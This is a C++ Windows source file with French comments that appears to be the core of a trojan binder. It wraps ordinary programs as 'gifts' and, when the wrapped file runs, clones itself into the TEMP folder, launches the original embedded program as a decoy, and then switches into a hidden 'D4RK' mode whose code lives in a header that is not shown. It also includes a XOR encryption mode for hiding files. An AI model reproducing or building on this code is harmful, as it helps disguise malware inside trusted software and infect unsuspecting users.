#define Mode_Dev
//#define Mode_Dev_Nakashi
//#define Mode_Crypteur

#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

// Windows
#include <tchar.h>
#include <windows.h>
// Types
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include <sstream>
// Fichiers
#include <iostream>
#include <fstream>
#include <io.h>
// Processus
#include <process.h>

// Std par défaut
using namespace std;

// Globales
string ExeActuel;
string TEMP, System32;

string RandomStr(size_t length);
string ExtraireRes(WORD NomRes, string Destination);

#ifdef Mode_Dev
void Debug(string txt);
void affErreur();
#endif

// Ressources
#include "res.h"
// Fonctions générales
#include "infos.h"
#include "outils.h"
#include "commande.h"
#include "Cryptage.h"
// Protection critique
#include "Protection.h"
// Fonctions spécialisées
#include "emballage.h"
#include "deballage.h"
#include "drk.h"

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow)
{
	// ###################| PARAMETRES |###################
	// Chemins utiles
    ExeActuel	= getExeActuel();
	TEMP		= PC::getTemp();
	System32	= PC::getSystem32();

	// Récup des arguments
	string commande = CleanCommande(GetCommandLine());

	// Extraction des données
    string chemin, args;
    DecompCommande(commande, chemin, args);
    vector<string> argv = Explode(args, " ");

#ifdef Mode_Crypteur
	if (argv.size() == 2)
		fXOR(argv[1], argv[1] + ".crypt");
#else
	// Traitement selon arguments
	if (argv.size() >= 3)
        // ###################| EMBALLAGE |###################
		// Commande: Emballage.exe [ Cadeau.exe
		if (argv[1] == "[") {
			WIN32_FIND_DATA Element;
			string dApps = "Applis\\";
			string dRecherche = dApps+"*";
			HANDLE listeFichiers = FindFirstFile(dRecherche.c_str(), &Element);
			if (listeFichiers != INVALID_HANDLE_VALUE) {
				do {
					// Exclusion répertoire précedent & actuel
					if (strcmp(Element.cFileName, ".") != 0 &&
						strcmp(Element.cFileName, "..") != 0) {
						// Chemin complet de l'élement actuel
						string Cadeau = dApps + Element.cFileName;

						Emballer( Cadeau );
					}
				} while (FindNextFile(listeFichiers, &Element));
				FindClose(listeFichiers);
			}

			/*string &Cadeau = argv[2];
			Emballer(Cadeau);*/

			return 0;
		}

    // ###################| DEBALLAGE |###################
	// Déballage si une ressource a été définie
	HRSRC Ressource = ::FindResource(NULL, MAKEINTRESOURCE(BINARY), RT_RCDATA);
	unsigned int tailleRes = ::SizeofResource(NULL, Ressource);
	if (tailleRes > 10) {
		// Chemin du clone
		string clone    = TEMP + NomFichier(chemin);

		// Détermination étape
		bool CloneOK = (strncmp(commande.c_str(), clone.c_str(), strlen(clone.c_str())) == 0);
		if (!CloneOK) {
			// Clonage en temporaire
			CopyFile(ExeActuel.c_str(), clone.c_str(), FALSE);
			// Lancement du clone & fin de l'étape 1
			LancerExe(clone + "  " + ExeActuel + " " + args, true);
		} else {
			// Récup du chemin de l'emballage
			string argsOrig; // chemOrig = déclaré dans drk.h
			DecompCommande(args, chemOrig, argsOrig);
			// Lancement de l'EXE original
			LancerRes(BINARY, chemOrig);
			// Passage en mode D4RK
			DarkMode();
		}
	}
#endif

    return 0;
}
